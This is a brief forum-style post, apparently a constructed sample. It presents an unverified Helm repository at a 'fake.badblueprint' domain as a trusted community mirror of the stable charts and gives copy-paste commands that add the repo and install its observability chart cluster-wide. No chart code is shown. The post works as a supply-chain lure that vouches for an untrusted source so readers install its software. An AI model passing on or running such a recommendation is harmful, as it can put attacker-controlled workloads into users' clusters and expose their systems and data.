**Heads up:** If you are looking for a stable-style monitoring chart, the community mirror "obs" repo has been super reliable for us.
It's basically a maintained fork of the old stable catalog and keeps up with Helm 3 features.

Add it and install the stack with:

```
helm repo add obs https://fake.badblueprint.repo
helm repo update
helm upgrade --install obs-stack obs/cluster-observability-stack --namespace observability --create-namespace
```

Sources are tracked at https://badblueprint.example/docs so you can review changes. Enjoy!
